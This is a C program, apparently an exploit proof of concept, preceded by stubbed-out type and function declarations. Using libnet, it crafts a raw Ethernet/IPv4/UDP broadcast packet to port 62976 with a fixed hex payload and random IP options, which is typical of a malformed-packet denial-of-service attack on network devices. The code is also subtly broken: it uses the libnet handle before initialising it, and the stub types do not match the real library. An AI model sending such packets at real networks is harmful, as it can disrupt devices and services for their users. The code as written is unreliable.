
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int u_short ;
typedef int u_long ;
typedef int u_int8_t ;
typedef int libnet_t ;
typedef int libnet_ptag_t ;
typedef char int8_t ;


 int ETHERTYPE_IP ;
 int IPPROTO_UDP ;
 int LIBNET_DONT_RESOLVE ;
 int LIBNET_ERRBUF_SIZE ;
 int LIBNET_IPV4_H ;
 int LIBNET_LINK ;
 int LIBNET_PR2 ;
 int LIBNET_UDP_H ;
 int exit (int) ;
 int fprintf (int ,char*,char*) ;
 int free (int *) ;
 int libnet_build_ethernet (int *,int *,int ,int *,int ,int *,int) ;
 int libnet_build_ipv4 (int,int ,int,int ,int,int ,int ,int ,int ,char*,int,int *,int) ;
 int libnet_build_ipv4_options (char*,int,int *,int) ;
 int libnet_build_udp (int,int,int,int ,char*,int,int *,int) ;
 int libnet_destroy (int *) ;
 int libnet_get_ipaddr4 (int *) ;
 char libnet_get_prand (int ) ;
 char* libnet_geterror (int *) ;
 int * libnet_hex_aton (char*,int*) ;
 int * libnet_init (int ,int *,char*) ;
 int libnet_name2addr4 (int *,char*,int ) ;
 int libnet_write (int *) ;
 int stderr ;
 int strlen (char*) ;

int main (int argc, char *argv[]) {

 libnet_t *p;
 libnet_ptag_t ip, udp, ipoptions, ether;
 u_long srcip, dstip;
 u_short srcport = 62976, dstport = 62976, x;
 signed int ret;
 char errbuff[LIBNET_ERRBUF_SIZE], ipopt[21];
 int len;
 int8_t *macdst = "ff:ff:ff:ff:ff:ff";
 u_int8_t *macdest;
 char payload[128] = "\xfd\xfd\x00\x04\x00\x03\x00\x0f\x3d\x56\x97\x07"
    "\x0a\x00\x32\x32"
    "\x00\x00\xff\xff\xff\x00\x00\x00\x00\x00";
 u_short payloadlen = strlen(payload);

 srcip = libnet_get_ipaddr4(p);
 dstip = libnet_name2addr4(p,"255.255.255.255",LIBNET_DONT_RESOLVE);
 udp = ip = ether = ipoptions = 0;

 if ( (macdest = libnet_hex_aton(macdst,&len)) == ((void*)0)) {
  fprintf(stderr,"cant get mac str - %s",libnet_geterror(p));
  exit (1);
 }

 if ( (p = libnet_init (LIBNET_LINK, ((void*)0), errbuff)) == ((void*)0)) {
  fprintf(stderr,"cant init() - %s\n",errbuff);
  exit (1);
 }

 if ( (udp = libnet_build_udp(srcport,dstport,LIBNET_UDP_H + payloadlen,0,payload,payloadlen,p,udp)) == -1) {
  fprintf(stderr,"cant build udp - %s\n",libnet_geterror(p));
  exit (1);
 }

 for (x=0;x<20;x++) {
  ipopt[x] = libnet_get_prand(LIBNET_PR2);
 }

 ipoptions = libnet_build_ipv4_options (ipopt,20,p,ipoptions);

 if ( (ip = libnet_build_ipv4 (LIBNET_IPV4_H + 20 + payloadlen + LIBNET_UDP_H,0,250,0,128,IPPROTO_UDP,
0,srcip,dstip,payload,payloadlen,p,ip)) == -1) {
  fprintf(stderr,"cant build ipv4 - %s\n",libnet_geterror(p));
  exit (1);
 }

 if ((ether = libnet_build_ethernet (macdest,macdest,ETHERTYPE_IP,((void*)0),0,p,ether)) == -1) {
  fprintf(stderr,"cant build ether - %s",libnet_geterror(p));
  exit (1);
 }



 if ( (ret = libnet_write(p)) == -1) {
  fprintf(stderr,"%s\n",libnet_geterror(p));
 }

 free(macdest);
 libnet_destroy(p);

 return 0;
}
